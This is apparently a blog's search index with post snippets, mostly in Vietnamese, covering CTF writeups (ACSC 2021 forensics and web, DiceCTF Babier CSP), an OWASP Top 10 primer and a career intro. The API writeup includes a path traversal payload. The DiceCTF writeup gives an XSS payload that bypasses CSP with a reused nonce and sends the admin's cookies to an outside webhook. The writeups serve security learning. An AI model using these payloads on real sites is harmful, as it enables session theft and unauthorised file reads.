ngữ máy về assembly, hay còn gọi là disassemblers, như IDA; tool để debug chương trình, hay còn gọi là debuggers, như Ollydbg; tool để xem và chỉnh sửa giá trị của các bytes như Hex editor.Reverse engineering, túb iát? Đọc lý thuyết nhiều người ta gọi là mọt sách. Còn cày 4470 điểm trên reversing.kr rồi quét sạch crackmes.one thì người ta gọi là reverse engineer. Chắc vậy." }, { "title": "Asian Cyber Security Challenge 2021 | Forensics Writeup | Nyong Coin, BitLocker Artifact", "url": "/posts/ACSC2021-Forensics/", "categories": "CTF, Forensics Challenges", "tags": "writeups, forensics, acsc21", "date": "2021-09-22 23:20:00 +0700", "snippet": "Nyong CoinDescription Download file: link&#39;Kim&#39; is the CEO of a cryptocurrency exchange &#39;A&#39;. He asked the management team for the full transaction history of &#39;NYONG coin&#39; traded in a specific period.And here is &#39;Lee&#39;, a member of the management team who hates &#39;Kim&#39;, delivered a maliciously manipulated transaction history to &#39;Kim&#39; in a USB.Analyze the USB and find one manipulated transaction in there!Flag: ACSC{lowercase(MANIPULATED_TRANSACTION_ID)}SolutionBrief (2 ways)1. Using tools Using Autopsy to identify and carve deleted xlsx file from image file. The deleted file will be similar to 1 file in the main space -&amp;gt; identify that. Text diff 2 files to find the differences. The difference row is the answer2. Using knowledge History to data inserted is preserved in xl/sharedStrings.xml (no log formatted strings such as date, currency, scientific, etc.) PhoneticPr attribute is used to provide a phonetic hint for a string, only generate when data is typed, not Copy&amp;amp;PasteDetails1. Using toolsThe downloaded file has a E01 extensions, which indicates an image dump from NetWitness.$ file NyongCoin.E01NyongCoin.E01: EWF/Expert Witness/EnCase image file formatThese file can be viewed and analysed using tools like FTK Imager, Autopsy or ProDiscover. In my case, I noticed hex data of a xlsx file in the unallocated space in FTK Imager but decided not to carve the file out (outstanding move 🤡). Therefore I didn’t finnish the challlenge.To solve the challenge (or any other image forensics challenges), best use tools is Autopsy. After import image to autopsy, go to CarvedFiles then export xlsx files (the data in 2 files are the same so take 1 file only). Identify the original file by checking the fist row data of every files. Go to TextCompare.org, upload the exported file (carved file) and the original file and then compare. The answer is: 8d77a554-dc64-478c-b093-da4493a8534d Flag: ACSC{8d77a554-dc64-478c-b093-da4493a8534d}2. Using knowledge Extract all xlsx file as zip to a folder then Grep PhoneticPr in all sharedString.xml files.$ for file in `find . -name sharedStrings.xml`;do grep -Hoi &quot;phoneticPr&quot; $file;done./20200715132932_20200816181652/xl/sharedStrings.xml:phoneticPr Finding the id (you can just view in text editor):$ grep -Eo &quot;phoneticPr.*$&quot; ./20200715132932_20200816181652/xl/sharedStrings.xmlphoneticPr fontId=&quot;1&quot; type=&quot;noConversion&quot;/&amp;gt;&amp;lt;/si&amp;gt;&amp;lt;si&amp;gt;&amp;lt;t&amp;gt;8d77a554-dc64-478c-b093-da4493a8534d&amp;lt;/t&amp;gt;&amp;lt;phoneticPr fontId=&quot;1&quot; type=&quot;noConversion&quot;/&amp;gt;&amp;lt;/si&amp;gt;&amp;lt;/sst&amp;gt;BitLocker ArtifactDescription Download file: linkGet the datetime that C drive was encrypted by BitLocker!Start: When the BitLocker Wizard was run (UTC+0, YYYY-MM-DD_HH:MM:SS)End: When encryption was completed by BitLocker (UTC+0, YYYY-MM-DD_HH:MM:SS)Flag: ACSC{Start_End}ex: ACSC{2021-05-06_12:00:01_2021-05-06_12:53:11}SolutionBriefThe target is to identify the start and end timestamp of Bitlocker in registry hives.Refer to this tweet, to view the timestamp, we need to go to \\SYSTEM\\CurrentControlSet\\Control\\FVEStats\\.The start time is OsvEncryptInit and end time gonna be OsvEncryptComplete.DetailsTo view the registry, use Registry Viewer of AccessData or Registry Explorer/RECmd of ericzimmerman.Open SYSTEM file in the tool (In my case it’s Registry Viewer). Locate to \\SYSTEM\\ControlSet001\\Control\\FVEStats\\ Start time: 132741897867405652 End time: 132741901078561213To convert windows timestamp to UTC timePS C:\\&amp;gt; [datetime]::FromFileTimeUTC(&quot;132741897867405652&quot;)Monday, August 23, 2021 10:56:26 AMPS C:\\&amp;gt; [datetime]::FromFileTimeUTC(&quot;132741901078561213&quot;)Monday, August 23, 2021 11:01:47 AM" }, { "title": "Asian Cyber Security Challenge 2021 | Web Writeup | API", "url": "/posts/ACSC2021-Web-API/", "categories": "CTF, Web Challenges", "tags": "writeups, web, acsc21", "date": "2021-09-22 22:20:00 +0700", "snippet": "APIThử thách: Easy and simple API: https://api.chal.acsc.asia Source codeKiến thức nền: Broken Access Control.Giải quyết vấn đề:Thăm dò:Như mọi dạng bài cho source code từ trước, việc đầu tiên chúng ta cần làm là tôn trọng tác giả, mở source code ra đọc và deploy nó lên. Vào trong root folder public rồi deploy trên locahost bằng lệnh php -S localhost:&amp;lt;any port number&amp;gt;. Tạm thời chưa quan tâm đến các file config như 000-default.conf, docker-compose.yml hay Dockerfile, chúng ta sẽ sử dụng sau. Nhìn sơ qua thì chúng ta có một cái web app chỉ có 3 chức năng thế này: Sign in: Sign up: Trang admin (không hiểu sao không cần sign in cũng vào được, nhưng mà nhìn chung nó cũng vô dụng):Thử tạo một account tại signup.html rồi đăng nhập vào thử:Nghiên cứu source code:Bài này nhìn chung là khá dễ, nếu thậm chí nếu bạn đọc code và suy nghĩ theo cách đơn giản thì sẽ ra flag cực kì nhanh. Nhưng tôi và thằng teammate baolongv3 đã chọn cách khó hơn, đó là ăn hết tất cả cú lừa của bài này.Cú lừa đầu tiên, không biết là vô tình hay cố ý mà tác giả lại để lộ 2 cái file “mới nhìn tưởng là quan trọng và là chìa khóa để tìm ra flag” này: user.db: file chứa toàn bộ thông tin account của tất cả các user trên web app này, mỗi field thông tin khác nhau được ngăn cách bởi dấu ** ** (theo tôi dự đoán thì nó theo format sau: **username hash của password user level (admin sẽ được gán bằng 1, normal user được gán bằng 0)). Khi refresh trang thì ta thấy file được append thêm một số account mới. Tất cả các account này đều có user level bằng 0. Chỉ duy nhất account có username tên **Pang (trong hình) có user level bằng 1. Nhìn vào hàm main, ta thấy file user.db vốn không có sẵn trong folder db. Nó được khởi tạo bằng cách gọi hàm gen_user_db:function gen_user_db($acc){ $path = dirname(__FILE__).DIRECTORY_SEPARATOR; $path .= &quot;db&quot;.DIRECTORY_SEPARATOR; $path .= &quot;user.db&quot;; if (file_exists($path)) return false; else { global $admin; $u = new User($acc); $fmt = sprintf(&quot;%s|%s|%d,&quot;, $admin[&#39;id&#39;], $u-&amp;gt;gen_hash($admin[&#39;pw&#39;]), $admin[&#39;level&#39;]); file_put_contents($path, $fmt); }}Nếu file user.db chưa được tạo, nó sẽ được tạo mới bởi hàm file_put_contents, đồng thời hàm này sẽ ghi vào file user.db mới được tạo account của admin thông qua biến $fmt, biến này lại lấy các field id, pw và level từ global array $admin được gọi từ file config.php:&amp;lt;?php$admin = [&#39;id&#39; =&amp;gt; &quot;*secret*&quot;, &#39;pw&#39; =&amp;gt; &quot;*secret*&quot;, &#39;level&#39; =&amp;gt; 1];?&amp;gt;Vậy là đúng như dự đoán, admin được gán level bằng 1, như vậy account có id là “Pang” chắc chắn là admin, và ta cần lấy được password của user này bằng cách dehash cái này: c307cae832059f15e52cc5e6a26a2eb3ae7173e6. Password được hash bằng hàm ripemd160:public function gen_hash($val){ return hash(&quot;ripemd160&quot;, $val);}Nhưng có vẻ đây là một challenge dùng não 100%, đừng phí thời gian chạy hashcat hàng tiếng đồng hồ để tìm password như tôi nhé, nó không ra cái gì đâu @@ passcode.db: chứa một string có độ dài 5 kí tự, nếu chỉ nhìn mà không đọc code kĩ thì sẽ rất dễ nhầm đây là salt mà tác giả ném vào hàm hash ripemd160 để băm password của các user. Nếu deploy đoạn code này (lấy từ hàm gen_pass_db) thì bạn sẽ đấy string này random từ biến $rand_str sau mỗi lần refresh trang:$rand_str = &quot;`~1234567890-=!@#$%^&amp;amp;*()_+qwertyuiopT[]\\\\&quot;;$rand_str .= &quot;asdfghjkl;&#39;:\\&quot;zxcvbnm./&amp;lt;&amp;gt;?QWERASDFZCVBNM&quot;;$res = &#39;&#39;;for($i = 0; $i &amp;lt; $len; $i++){ $res .= $rand_str[rand(0, strlen($rand_str)) - 1];}echo $res;Nhưng trên url thì dù refresh lại bao nhiêu lần nó cũng ra “:&amp;lt;vNk”. Lí do là vì file passcode.db cũng hoạt động giống file user.db, nếu file đã được tạo rồi thì hàm sẽ kết thúc và không đụng gì file nữa:if (file_exists($path)) return false;=&amp;gt; Xem xong file này tôi có 2 thắc mắc:- Hai hàm gen_user_db và gen_pass_db đều hoạt động giống y hệt nhau, tại sao refresh trang user.db thì thấy các account mới được append vào còn passcode.db thì vẫn giữ nguyên như vậy? Chứng tỏ có một hàm nào đó khác nữa đã làm công việc append này, và nó chính là hàm signup (check file):public function signup(){ if (!preg_match(&quot;/^[A-Z][0-9a-z]{3,15}$/&quot;, $this-&amp;gt;acc[0])) return false; if (!preg_match(&quot;/^[A-Z][0-9A-Za-z]{8,15}$/&quot;, $this-&amp;gt;acc[1])) return false; $data = $this-&amp;gt;load_db(); for($i = 0; $i &amp;lt; count($data); $i++){ if ($data[$i][0] == $this-&amp;gt;acc[0]) return false; } file_put_contents($this-&amp;gt;db[&#39;path&#39;], $this-&amp;gt;db[&#39;fmt&#39;], FILE_APPEND); // $this-&amp;gt;db[&#39;path&#39;] == &#39;public/lib/db/user.db&#39; và $this-&amp;gt;db[&#39;fmt&#39;] = sprintf(&quot;%s|%s|%d,&quot;, $this-&amp;gt;acc[0], $this-&amp;gt;gen_hash($this-&amp;gt;acc[1]), 0) return true;}- Nếu “:&amp;lt;vNk” trong file passcode.db không phải là salt của hàm hash ripedm160, vậy nó được tạo ra để làm gì? Nhìn vào hàm is_pass_correct trong file Admin.class.php, ta thấy $passcode lấy data từ file passcode.db thông qua hàm get_pass, $input lấy data từ value của parameter pas được lưu trên superglobal REQUEST, sau đó nếu 2 biến này bằng nhau thì return true:public function is_pass_correct(){ $passcode = $this-&amp;gt;get_pass(); // $passcode == &#39;:&amp;lt;vNk&#39; $input = $_REQUEST[&#39;pas&#39;]; if ($input == $passcode) return true;}Khai thác: Nói thêm một chút về các parameter nằm trong superglobal REQUEST của bài này, tất cả đều được gửi từ form signin thông qua hàm signin nằm trong file client.js. Nếu theo luồng hoạt động của hàm này thì chỉ có 3 parameter được gửi vào REQUEST là id, pw và c (1). Như vậy, để hàm is_pass_correct có thể return true, ta phải tự chèn thêm parameter pas=:&amp;lt;vNk vào sau khi sign in (2). Như đã thấy ở phần thăm dò, dù có tạo được account thì chúng ta cũng không thể vào được bên trong, web app chỉ alert rằng “Only admin can access the page”. Bắt thử một request rồi send qua repeater của Burp Suite thì ta được: Response cho biết rằng trang web đang bị chuyển hướng đến /api.php?#access denied do đoạn code javascript location.href = &#39;/api.php?#access denied&#39;;. Vậy đoạn code javascript này từ đâu ra. Check hàm main rồi mò lại hàm challenge, ta có:$admin = new Admin();if (!$admin-&amp;gt;is_admin()) $admin-&amp;gt;redirect(&#39;/api.php?#access denied&#39;);$cmd = $_REQUEST[&#39;c2&#39;];if ($cmd) { switch($cmd){ case &quot;gu&quot;: echo json_encode($admin-&amp;gt;export_users()); break; case &quot;gd&quot;: echo json_encode($admin-&amp;gt;export_db($_REQUEST[&#39;db&#39;])); break; case &quot;gp&quot;: echo json_encode($admin-&amp;gt;get_pass()); break; case &quot;cf&quot;: echo json_encode($admin-&amp;gt;compare_flag($_REQUEST[&#39;flag&#39;])); break; }} Đọc lướt qua thì ta sẽ thấy đây là một đoạn code authorize rất bình thường, khi account không phải admin thì sẽ trả về response như đã thấy trên Burp Suite. Nhưng nhìn kĩ lại một chút thì chúng ta phát hiện một sai lầm cực kì tai hại của người viết đoạn code này, đó chính là dùng if (!$admin-&amp;gt;is_admin()) cho câu lệnh $admin-&amp;gt;redirect(&#39;/api.php?#access denied&#39;); nhưng lại quên đặt các khối lệnh phía sau vào else. Điều này đồng nghĩa rằng kể cả account của bạn không phải là admin, đăng nhập vào bị alert ra lỗi, nhưng vẫn có thể thực thi toàn bộ các lệnh ở phía sau if. Vấn đề bây giờ chỉ là chọn value nào để inject vào parameter c2 trong các value gu, gd, gp và cf. Nếu chọn gd thì ta sẽ gọi được hàm export_db, hàm này lại lấy data từ paramter db. Cùng xem hàm này hoạt động như thế nào:public function export_db($file){ if ($this-&amp;gt;is_pass_correct()) { $path = dirname(__FILE__).DIRECTORY_SEPARATOR; $path .= &quot;db&quot;.DIRECTORY_SEPARATOR; $path .= $file; $data = file_get_contents($path); $data = explode(&#39;,&#39;, $data); $arr = []; for($i = 0; $i &amp;lt; count($data); $i++){ $arr[] = explode(&#39;|&#39;, $data[$i]); } return $arr; }else return &quot;The passcode does not equal with your input.&quot;;} Để hàm này có thể chạy được ta cần phải chèn vào request pas=:&amp;lt;vNk như đã giải thích ở cuối phần Nghiên cứu source code. Trong luồng hoạt động của hàm này chúng ta chỉ cần để ý duy nhất lệnh $data = file_get_contents($path); là có thể kết luận sử dụng hàm này ta có thể đọc được nội dung của một file bất kì trong hệ thống, trong đó có file flag. Sau khi mò được đường dẫn của flag thì ta đã có flag trong tay: Payload: id=Baictfkhoqua&amp;amp;pw=Aa1234567&amp;amp;c=i&amp;amp;pas=:&amp;lt;vNk&amp;amp;c2=gd&amp;amp;db=../../../../../../../flag Flag: ACSC{it_is_hard_to_name_a_flag..isn&#39;t_it?}" }, { "title": "Bí kíp 300 bài Web thiếu nhi", "url": "/posts/300-Bai-Web-Thieu-Nhi/", "categories": "Wiki, Web Exploitation", "tags": "wiki, web", "date": "2021-09-20 19:45:00 +0700", "snippet": "Internet ngày nay đã trở thành một phần không thể thiếu trong cuộc sống của mỗi chúng ta. Cùng với sự phát triển của internet, các website cũng ngày càng phức tạp hơn so với những phiên bản đầu tiên của nó vào những năm 1990. Website bao gồm 2 phần chính, là front-end (bộ mặt của website) và back-end(bộ não của website). Back-end là khu vực xử lý các thao tác với database (cơ sở dữ liệu), trả lại các giá trị dựa trên những request (yêu cầu) mà client (người dùng) gửi lên server. Vì back-end là nơi lưu trữ các dữ liệu quan trọng của người dùng một trang web như tài khoản, mật khẩu, thông tin cá nhân,… nó trở thành mục tiêu tấn công của các hacker, nhằm vào các thông tin nhạy cảm. Việc xây dựng một trang web cũng vô cùng phức tạp, nên các lỗ hổng bảo mật (vulnerability) xuất hiện là điều không thể tránh khỏi, dẫn tới sự xuất hiện của lĩnh vực “Web Exploitation” (khai thác ứng dụng web). Với tư cách là một sinh viên đang ngồi trên ghế nhà mình, học online tại FPTU, mình xin chia sẻ một vài hiểu biết của bản thân về một lĩnh vực rộng lớn và vô cùng quan trọng trong ngành bảo mật. Năm 2017, OWASP đã công bố 10 lỗ hổng nghiên trọng, phổ biến trên website như sau: Injection: Hậu quả của việc server nhận dữ liệu không được kiểm chứng và được biên dịch dưới dạng các câu lệnh hoặc các query (truy vấn trong cơ sở dữ liệu). Tiêu biểu phải kể đến SQL Injection, lỗi xuất hiện trên hệ cơ sở dữ liệu SQL. Lỗi này có thể giúp hacker xem, xóa, sửa, các thông tin trên hệ cơ sở dữ liệu. Bên cạnh đó chúng ta còn có LDAP injection và HTTP header injection. Tất cả các lỗ hổng trên đều dễ gặp phải ở những trang web của những lập trình viên mới vào nghề, còn ít kinh nghiệm (ngoại trừ trang web của tập đoàn B* nào đó 🐧 ) Cross-Site Scripting XSS: Xảy ra khi hacker chèn mã độc (thường viết bằng ngôn ngữ JavaScript) thông qua các đoạn script để thực thi ở phía client. Thông thường, một đoạn mã độc được ngụy trang dưới dạng dữ liệu xuất nhập thông thường sẽ được gửi lên server. Nếu không có các bộ lọc dữ liệu độc hại, mã độc sẽ được chèn vào mã nguồn của ứng dụng web (ta thường gọi trang web đó đã bị XSS) và bất cứ lúc nào người dùng bình thường truy cập website, các mã độc đó sẽ thực thi ngay trên trình duyệt của người dùng. Broken Authentication: Ứng dụng web có thể cài đặt phần đăng nhập không chính xác, khiến cho hacker có thể chạy các trình brute-force nhằm tìm được chính xác tài khoản và mật khẩu của người dùng, dẫn tới việc chiếm tạm thời hoặc hoàn toàn tài khoản đó. Sensitive Data Exposure: Rất nhiều trang web và các API thường không bảo vệ các dữ liệu nhạy cảm của người dùng như thông tin tài chính, sức khỏe,… một cách hợp lý. Ví dụ, mật khẩu, tài khoản được mã hóa sơ sài trong cookies. Điều này dẫn tới các dữ liệu ấy có thể bị lấy được trong quá trình truyền dữ liệu từ client tới server. Broken Access Control: Lỗi này xảy ra khi có lỗ hổng trong việc hạn chế người dùng bình thường truy cập vào các vùng bị hạn chế. Kẻ tấn công có thể tìm thấy các lỗi này và truy cập vào các vùng bị cấm, chỉnh sửa thông tin người dùng, thay đổi quyền của admin, đánh cắp thông tin của toàn bộ hệ thống…. XML External Entities (XXE): Nói đơn giản, lỗ hổng này nhằm tới file XML (một loại ngôn ngữ đánh dấu) trên các ứng dụng web. Các file XML quá cũ hoặc được cài đặt kém sẽ là đối tượng tấn công, vì đã để lộ các thông tin như port, shared file, … Hacker sẽ khai thác các thông tin này để scan port, thực thi code từ xa, hoặc thậm chí là DoS và DDoS. Security Misconfiguration: Đây là lỗ hổng thường gặp nhất và là hậu quả của việc sử dụng các cài đặt mặc định, vốn không an toàn trước những cuộc tấn công. Lỗi có thể xảy ra ở các kho lưu trữ đám mây mở, việc đặt HTTP header sai, hoặc các thông báo lỗi rườm rà sẽ chứa các thông tin nhạy cảm. Vì vậy, các hệ thống không chỉ cần được cài đặt một cách an toàn, chúng còn cần được cập nhật liên tục. Insecure Deserialization: Lỗ hổng này có thể dẫn tới việc thực thi các mã ở máy khách hàng. Dù việc này không dẫn tới việc thực thi mã độc từ xa, nó cũng có thể được dùng để tạo ra các cuộc tấn công, bao gồm tấn công lặp lại, tấn công kiểu injection, và tấn công leo thang đặc quyền. Using Components with Known Vulnerabilities: Xây dựng 1 website cần rất nhiều thành phần, bao gồm thư viện, framework, các module phần mềm, và chúng sẽ chạy với quyền tương tự như quyền của ứng dụng web đấy. Nếu một trong các thành phần đang chạy bị hack, hacker có thể lợi dụng quyền của nó để xâm nhập vào hệ thống. Insufficient Logging &amp;amp; Monitoring: Như tên gọi của lỗi này, ghi nhật ký và giám sát không đầy đủ, việc khai thác có thể gây nên các sự cố rất lớn. Kẻ tấn công dựa vào việc thiếu giám sát và phản ứng kịp thời để đạt được mục tiêu của chúng mà không bị phát hiện. Nói chung, các lỗ hổng này thường được chia thành 3 mức độ nguy hiểm. Mức đầu tiên là các lỗ hổng gây ảnh hưởng tới 3 thuộc tính của dịch vụ là: Tính bảo mật, tính toàn vẹn và tính sẵn sàng. Nguy hiểm hơn là các lỗ hổng có thể gây nên việc thực thi mã từ xa. Và nguy hiểm nhất, chính là lỗ hổng gây nên các cuộc tấn công leo thang đặc quyền. Khi hacker thành công trong việc leo thang đặc quyền, hacker sẽ trở thành bố của hệ thống, có thể tùy ý tung hoành ngang dọc trong hệ thống mà không bị ai chặn lại, thậm chí có thể xóa luôn cả hệ thống ấy. Vì vậy, bên cạnh việc xây dựng giao diện thật đẹp, cũng như các tính năng hữu ích, việc bảo vệ hệ thống và tìm kiếm, nghiên cứu các lỗ hổng ứng dụng web mới luôn được đặt lên hàng đầu để tránh các hậu quả nặng nề.Hãy theo dõi page của EHC để nhận thêm các thông tin, các tip hữu ích về an toàn thông tin trên mạng các bạn nhé !!!" }, { "title": "Information Assurance 101", "url": "/posts/Information-Assurance-101/", "categories": "Wiki, Career", "tags": "wiki, career", "date": "2021-09-14 20:07:00 +0700", "snippet": "Trong một thời đại mà mọi quy trình nhàm chán đều có thể tự động hóa bằng những dòng code, số lỗ hổng bảo mật được phát hiện từ đó cũng tăng lên theo cấp số nhân, bởi lẽ không có một hệ thống, không có một sản phẩm được viết ra bằng code nào lại đảm bảo được sự an toàn tuyệt đối cả. Ngành An Toàn Thông Tin cũng vì đó mà trở thành một ngành cực kì rộng lớn với rất nhiều lĩnh vực. Với tư cách là một sinh viên vẫn đang còn ngồi trên ghế FPTU, mình chỉ xin chia sẻ về ngành IA trong giới hạn giảng dạy hiện nay của ngôi trường ba chữ. Nếu xét trên khía cạnh nghiên cứu hàn lâm, học thuật thì có thể chia ngành này thành 6 mảng. Các môn học được giảng dạy ở ngành IA tại FU cũng bám theo 6 mảng cốt lõi này: Web Application Exploitation (Khai thác ứng dụng web), ứng với các môn IAW (Web Security) và HOD (Ethical Hacking and Offensive Security). Reverse Engineering (Dịch ngược), ứng với môn IAM. Binary Exploitation (Khai thác lỗi phần mềm), đây là một mảng khó, vẫn chưa được đưa vào giảng dạy. Cryptography (Mật mã học), ứng với môn CRY. Forensics (Điều tra chứng cứ số), ứng với môn FRS. Networking Security (An toàn mạng), ứng với môn NWC. Trong series “An toàn thông tin 101” này, chúng tôi – FPTU Ethical Hackers Club sẽ cùng các bạn khai phá những vùng đất vô cùng mới lạ kể trên của ngành IA. Trước hết, hãy đảm bảo rằng các bạn đã chuẩn bị đầy đủ hành trang sau đây: Một tâm hồn đẹp: khiêm tốn, đam mê khám phá, kiên trì, đó là 3 phẩm chất quan trọng để trở thành một “ethical hacker”. Đủ khiêm tốn để luôn luôn cảm thấy kiến thức của mình còn nhiều thiếu sót và không ngừng học hỏi. Đủ đam mê khám phá để luôn luôn cảm thấy tò mò khi nhìn thấy một dòng code, một tính năng của trang web, phần mềm. Và đủ kiên trì để ngồi hàng tiếng đồng hồ, hàng tuần và thậm chí là hàng tháng trời để đào sâu vào dòng code, vào tính năng đó cho đến khi tìm được lỗ hổng mới thôi. Một vài kiến thức nền: lỗ hổng bảo mật không phải tự nhiên rơi từ trên trời xuống. Bạn phải có sự am hiểu nhất định về cơ chế hoạt động của đối tượng mà bạn đang tấn công. Sẽ dễ dàng và nhanh chóng hơn trong quá trình tìm hiểu nếu bạn đã có sẵn những kiến thức nền sau: Lập trình: hãy bắt đầu từ những ngôn ngữ lập trình “học đường” như C, C++ hay Java để hiểu rõ những khái niệm cơ bản trong lập trình như biến, hàm, Structured Programming hay OOP, sau đó khi nhảy sang học các ngôn ngữ khác bạn sẽ cảm thấy rất dễ dàng. Một số môn học lập trình của ngành IA tại FPTU mà bạn cần lưu ý: PRF, PRO, PRP. Hệ điều hành: học cách sử dụng những hệ điều hành mã nguồn mở như Linux cho phép bạn hiểu rõ hơn về bản chất và cấu trúc của hệ điều hành. Một số môn học về hệ điều hành của ngành IA tại FPTU mà bạn cần lưu ý: OSG, OSP Ồ, bạn đã chuẩn bị hết mọi thứ rồi à? Vậy thì hãy nhấn like chiếc page này của bọn mình để bắt đầu hành trình đi tìm hiểu ngành An Toàn Thông Tin nào." }, { "title": "DiceCTF 2021 | Web Writeup | Babier CSP", "url": "/posts/DiceCTF-BabierCSP/", "categories": "CTF, Web Challenges", "tags": "writeups, web, dicectf21", "date": "2021-02-12 21:00:00 +0700", "snippet": "BABIER CSPThử thách: Baby CSP was too hard for us, try Babier CSP. babier-csp.dicec.tf Admin Bot The admin will set a cookie secret equal to config.secret in index.js. Downloads index.js Kiến thức nền: Content Security Policy (CSP). XSS (Cross-site scripting). Webhook (Reverse API). Giải quyết vấn đề:Initial reconnaissance:Đề bài cho hai trang 1 là của client và 1 là của admin. Check thằng client trước xem sao:Bấm thử vào cái dòng “View Fruit” liên tục thì nó hiện ra tên các loại Fruit:vCTRL + U rồi check source code xem:&amp;lt;html&amp;gt;&amp;lt;a href=&#39;#&#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt;&amp;lt;script nonce=g+ojjmb9xLfE+3j9PsP/Ig==&amp;gt;elem.onclick = () =&amp;gt; {location = &quot;/?name=&quot; + encodeURIComponent([&quot;apple&quot;, &quot;orange&quot;, &quot;pineapple&quot;, &quot;pear&quot;][Math.floor(4 * Math.random())]);}&amp;lt;/script&amp;gt;&amp;lt;/html&amp;gt;Từ source code ta biết được trang web này sẽ random các loại Fruit bao gồm “apple”, “orange”, “pineapple”, “pear” rồi hiển thị tên nó lên mỗi lần mình click vào dòng “View Fruit”. Tên của các fruit này được truyền thông qua GET parameter “name”. Thử inject một vài thứ gì đó vui vui xem nào.Uầy!! Được luôn nè! Như vậy khả năng cao trang web này bị dính XSS rồi. Tiếp tục khai thác thôi.Bypassing CSP to exploiting XSS:Vừa đúng lúc ngày hôm qua mới được học về XSS. Tuy nhiên khi check thử vài payload XSS mẫu như &amp;lt;script&amp;gt; alert(1) &amp;lt;/script&amp;gt; (script hiện dòng cảnh báo có nội dung là “1” ở trên trang web ) thì không thấy gì cả. Check lại source code của trang web thì tôi phát hiện ra 1 điều đáng ngờ:&amp;lt;script nonce=&#39;g+ojjmb9xLfE+3j9PsP/Ig==&#39;&amp;gt; ... &amp;lt;/script&amp;gt;Đây là thẻ script chứa câu lệnh để random các loại fruit rồi print ra. Thẻ này có một thuộc tính mà tôi chưa gặp bao giờ nonce=&#39;g+ojjmb9xLfE+3j9PsP/Ig==&#39;. Thử research 1 chút thì tôi biết được “nonce” là một thuộc tính được quy định trong CSP (Content-Security-Policy). Chỉ cần paste url vào đây là chúng ta có thể đọc được toàn bộ CSP của trang web đó:Từ CSP check được ta kết luận rằng tất cả các thẻ trong HTML Document đều không bị “ruled” bởi CSP (vì directive default-src được set giá trị là “none”), chỉ có duy nhất thẻ script là bị “ruled” (vì script-src được set giá trị là “nonce-g+ojjmb9xLfE+3j9PsP/Ig==”). Điều này có nghĩa là nếu muốn inject một thẻ script vào HTML Document của trang web này, ta phải kèm vào nó một thuộc tính nonce với giá trị là ‘g+ojjmb9xLfE+3j9PsP/Ig==’. Download code javascript (NodeJS) “index.js” từ đề bài, tìm thấy dòng code set giá trị cho thuộc tính “nonce” này bằng phương thức randombytes:const NONCE = crypto.randomBytes(16).toString(&#39;base64&#39;);Nhìn có vẻ như giá trị nonce này sẽ random liên tục và mỗi giá trị nonce sẽ chỉ xuất hiện 1 lần mỗi khi ta refresh lại trang (đúng theo quy tắc là thế). Nhưng bằng 1 cách magic nào đó, refresh cái trang này bao nhiêu lần nonce vẫn giữ nguyên giá trị là ‘g+ojjmb9xLfE+3j9PsP/Ig==’??? Ngon quá, vậy là chỉ cần ốp nguyên cái thằng nonce này vào payload là xong hihi!Đã xong phần XSS payload. Như vậy chúng ta hoàn toàn có thể tấn công vào trang web này thông qua lỗ hổng Reflected XSS (các bạn có thể tham khảo về các vuln XSS tại đây).Đánh cắp cookie từ trang admin:Thông thường khi muốn đánh cắp cookie bằng XSS bạn cần host một server đóng vai trò là điểm cuối tiếp nhận request gửi đến từ trang của victim (do payload XSS đã làm thay đổi đường đi của ban đầu request, thay vì đến nơi cần đến, nó sẽ đến server do bạn host và bạn có thể tha hồ đọc nó!). Thật may mắn là tôi có tìm được một site khá tiện lợi mà đơn giản cho phép chúng ta tạo một webhook có tên là requestcatcher. Chỉ cần gõ vài phát là bạn có ngay một cái webhook:DBây giờ chỉ cần viết lại payload dựa theo CSP đã quy định của trang web:&amp;lt;/h1&amp;gt; &amp;lt;!-- đóng thẻ h1 lại vì trong HTML có 1 thẻ &amp;lt;h1&amp;gt; (open) --&amp;gt;&amp;lt;script nonce=&#39;g+ojjmb9xLfE+3j9PsP/Ig==&#39;&amp;gt; &amp;lt;!-- mở thẻ script với giá trị nonce đã được quy định --&amp;gt; scrp_tag = document.createElement(&#39;script&#39;); &amp;lt;!-- tạo đối tượng &quot;thẻ script&quot;mới tên là &quot;scrp_tag&quot; --&amp;gt;scrp_tag.src = &#39;https://antoine.requestcatcher.com/? flag=&#39;.concat(JSON.stringify(document.cookie)); &amp;lt;!-- chỉnh attribute src của &quot;scrp_tag&quot; để request của admin bot được redirect đến webhook mà ta đã tạo và chứa trong đó tham số &quot;flag&quot; được gán bằng cookie của admin bot --&amp;gt; scrp_tag.nonce = &#39;g+ojjmb9xLfE+3j9PsP/Ig==&#39; &amp;lt;!-- setup attribute nonce của &quot;scrp_tag&quot; cho phù hợp với CSP --&amp;gt;contain_tag = document.querySelector(&quot;body&quot;); &amp;lt;!-- tham chiếu đến thẻ body của HTML Document --&amp;gt;contain_tag.appendChild(scrp_tag); &amp;lt;!-- thêm &quot;scrp_tag&quot; vào body của HTML Document để thực thi script --&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/h1&amp;gt;Cuối cùng chúng nhúng cái payload này vào link babier-csp.dicec.tf (vì Admin chỉ evaluate một mình cái link này) bằng cách gán nó vào parameter name:https://babier-csp.dicec.tf/?name=&amp;lt;/h1&amp;gt;&amp;lt;script nonce=&#39;g+ojjmb9xLfE+3j9PsP/Ig==&#39;&amp;gt;scrp_tag = document.createElement(&#39;script&#39;); scrp_tag.nonce = &#39;g+ojjmb9xLfE+3j9PsP/Ig==&#39;; scrp_tag.src = &#39;https://antoine.requestcatcher.com/?xss=&#39;.concat(JSON.stringify(document.cookie)); contain_tag = document.querySelector(&quot;body&quot;); contain_tag.appendChild(scrp_tag);&amp;lt;/script&amp;gt;&amp;lt;/h1&amp;gt;Well well well, hãy xem chúng ta có gì ở webhook https://antoine.requestcatcher.com/ sau khi submit cái link đó ở Admin Bot:Kết quả trả về ở tham số “flag” là một tham số khác có tên là “secret”. Cái tên này nghe khá là quen, hình như mình gặp đâu đó rồi…Hmmm, đây rồi, ngay trong souce code “index.js”:const SECRET = config.secret; // to be continued...app.use(&#39;/&#39; + SECRET, express.static(__dirname + &quot;/secret&quot;));Hằng SECRET được gán bằng “config.secret”, có khả năng “config.secret” là tham số “secret”. Đáng chú ý nhất là hàm middleware express.static - một hàm chuyên dùng để đọc và xử lý các nội dung tĩnh như file HTML, ảnh… Có thể tạm hiểu rằng sử dụng đường dẫn với token 4b36b1b8e47f761263796b1defd80745 trong request mà ta bắt được sẽ dẫn tới file “secret” của server:https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/Truy cập URL này ta thu được:Yolo!! CTRL + U rồi lấy flag thôi 